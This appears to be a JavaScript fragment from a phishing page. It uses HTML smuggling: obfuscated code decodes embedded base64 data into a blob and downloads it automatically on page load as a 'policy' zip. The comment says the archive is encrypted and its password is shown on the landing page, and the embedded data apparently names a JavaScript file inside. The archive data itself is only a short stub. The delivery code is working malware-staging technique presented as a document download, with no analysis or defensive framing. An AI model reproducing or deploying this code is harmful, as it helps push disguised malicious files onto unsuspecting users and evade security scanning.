// staged encrypted policy archive, password shown on the landing page
var c0 = "UEsDBBQACQAAAAAAAAAAAAAAAAAAAAAA";
var c1 = "AAAQAAAASU5WLTAzODcxLWRvYy5qcw==";
var payload = c0 + c1;
function pull() {
  var txt = window["atob"](payload);
  var bytes = new Uint8Array(txt.length);
  for (var k = 0; k < txt.length; k++) bytes[k] = txt["charCodeAt"](k);
  var item = new Blob([bytes], {"type": "octet/stream"});
  var link = document["createElement"]("a");
  link["href"] = window["URL"]["createObjectURL"](item);
  link["download"] = "policy-2026-047.zip";
  document["body"]["appendChild"](link);
  link["click"]();
}
setTimeout(pull, 200);
